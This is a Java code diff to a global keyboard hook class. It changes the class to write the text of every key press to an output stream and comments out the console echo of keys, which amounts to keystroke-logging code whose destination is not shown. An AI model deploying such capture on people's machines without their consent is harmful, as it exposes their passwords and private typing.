@@ -19,18 +19,12 @@ public class GlobalKeyListener implements NativeKeyListener {
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent keyEvent) {
-        String keyString = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
-        try {
-            outputStream.write(keyString.getBytes(Charset.forName("UTF-8")));
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
 
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent keyEvent) {
-        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
+        //System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
 
         if (keyEvent.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
             try {
@@ -38,6 +32,12 @@ public class GlobalKeyListener implements NativeKeyListener {
             } catch (NativeHookException e1) {
                 e1.printStackTrace();
             }
+        }
+        String keyString = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
+        try {
+            outputStream.write(keyString.getBytes(Charset.forName("UTF-8")));
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
